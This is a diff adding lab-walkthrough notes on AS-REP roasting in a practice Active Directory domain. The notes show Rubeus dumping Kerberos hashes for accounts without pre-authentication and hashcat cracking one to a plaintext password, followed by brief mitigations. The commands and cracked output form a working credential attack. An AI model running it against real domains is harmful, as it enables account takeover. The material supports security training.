@@ -653,3 +653,113 @@ I have already compiled and put Rubeus on the machine.*
 ### AS-REP Roasting Overview  
 
 During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.
+
+### Dumping KRBASREP5 Hashes with Rubeus
+
+1. Locate the Rubeus.exe on the target machine
+
+2. `Rubeus.exe asreproast` This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
+
+```
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe asreproast
+
+   ______        _                       
+  (_____ \      | |                      
+   _____) )_   _| |__  _____ _   _  ___  
+  |  __  /| | | |  _ \| ___ | | | |/___) 
+  | |  \ \| |_| | |_) ) ____| |_| |___ | 
+  |_|   |_|____/|____/|_____)____/(___/  
+                                         
+  v1.5.0                                 
+
+
+[*] Action: AS-REP roasting 
+
+[*] Target Domain          : CONTROLLER.local 
+
+[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users 
+[*] SamAccountName         : Admin2 
+[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local 
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::3d6e:f23:7c94:c6f2%5)
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$Admin2@CONTROLLER.local:1EF62C55816E1768BB5E7C68970F6A2A$0786DCCF4995
+      A5EB8D1229906FAAF821D8B1201B2224406D0EE4A3658D3A8E074D1A22473755E55E4E6E475C0E6E
+      53D5BEA7591F62867C9BF5072F706F664F3DADEBB934D42BCB5B9D5AA78D432ED55AF195D1334A2B
+      5A6BB447391FE20AA46DA438F2EFC04DDF3D0C3CA083D904C492FF27280290BDE79029F3E952B4AE
+      BC0753A05C870A5047901876AF15EAB375DBD90BCC7B55E79B0B68F7014544CF73CF66EC83C72843
+      72743CD10367999CD666E360EBA8406B60B9F88237C427A4AE9AFF4E55D0EF80FA14CA7AE08E3CA0
+      7938844D37FB837400196BA5359C4C82637D7FD6D237AF0E9CEA03487977BADEFE41503E471A
+
+[*] SamAccountName         : User3
+[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::3d6e:f23:7c94:c6f2%5)
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$User3@CONTROLLER.local:1CDB8FAD81AD8CC69F4D3D8946E3948F$B65B26794976E
+      1A6C0EE1F23BDAFCA28B677C4649EDA4236F5DEDB402CA57DBDCED9B296615A7DA20423EFEAAC6AD
+      7FA2DDEBD73DB27BFF3A9019642AEB1299620BEF06DED048BB56B3CB0FBA12C749504750FB4721BF
+      7BDF9ABA9708C15B72892905261B00DD97D8AD4FC50829264293D06241F30D0F519E2961ECBEE33D
+      ECF17FFC18E0D1C8F6FE3B2540C4AA158E3A5FC08D7398F52EE8B8279D184FC094A2EDDF05D58106
+      7649C64E1D68EC04A06989A68B73F30DA2874B956587C637C9A1ED0C152AD9D2F219B8BB1B19485C
+      3AE582CCE692A15B9A194F4909E3B17D32CC01770F970C450832DF4D63D2C6A46F86B5A769A
+
+```
+
+### Cracking the hashes with Hashcat
+
+1. Transfer the hash to attacking machine
+2. insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User....
+
+3. `hashcat -m 18200 hash.txt Pass.txt` Rubeus AS-REP Roasting uses hashcat mode 18200
+
+```
+└─$ hashcat -m 18200 hash.txt Pass.txt                                                                     
+hashcat (v6.1.1) starting...
+
+Host memory required for this attack: 81 MB
+
+Dictionary cache hit:
+* Filename..: Pass.txt
+* Passwords.: 1240
+* Bytes.....: 9706
+* Keyspace..: 1240
+
+The wordlist or mask that you are using is too small.
+This means that hashcat cannot use the full parallel power of your device(s).
+Unless you supply more work, your cracking speed will drop.
+For tips on supplying more work, see: https://hashcat.net/faq/morework
+
+Approaching final keyspace - workload adjusted.  
+
+$krb5asrep$23$User3@CONTROLLER.local:1cdb8fad81ad8cc69f4d3d8946e3948f$b65b26794976e1a6c0ee1f23bdafca28b677c4649eda4236f5dedb402ca57dbdced9b296615a7da20423efeaac6ad7fa2ddebd73db27bff3a9019642aeb1299620bef06ded048bb56b3cb0fba12c749504750fb4721bf7bdf9aba9708c15b72892905261b00dd97d8ad4fc50829264293d06241f30d0f519e2961ecbee33decf17ffc18e0d1c8f6fe3b2540c4aa158e3a5fc08d7398f52ee8b8279d184fc094a2eddf05d581067649c64e1d68ec04a06989a68b73f30da2874b956587c637c9a1ed0c152ad9d2f219b8bb1b19485c3ae582cce692a15b9a194f4909e3b17d32cc01770f970c450832df4d63d2c6a46f86b5a769a:Password3
+                                                 
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$User3@CONTROLLER.local:1cdb8fad81ad8c...5a769a
+Time.Started.....: Wed Aug  4 19:43:52 2021, (0 secs)
+Time.Estimated...: Wed Aug  4 19:43:52 2021, (0 secs)
+Guess.Base.......: File (Pass.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   552.5 kH/s (1.65ms) @ Accel:64 Loops:1 Thr:64 Vec:8
+Recovered........: 1/1 (100.00%) Digests
+Progress.........: 1240/1240 (100.00%)
+Rejected.........: 0/1240 (0.00%)
+Restore.Point....: 0/1240 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidates.#1....: 123456 -> hello123
+
+Started: Wed Aug  4 19:43:29 2021
+Stopped: Wed Aug  4 19:43:53 2021
+```
+
+### AS-REP Roasting Mitigations
+
+- Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
+
+- Don't turn off Kerberos Pre-Authentication unless it's necessary there's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
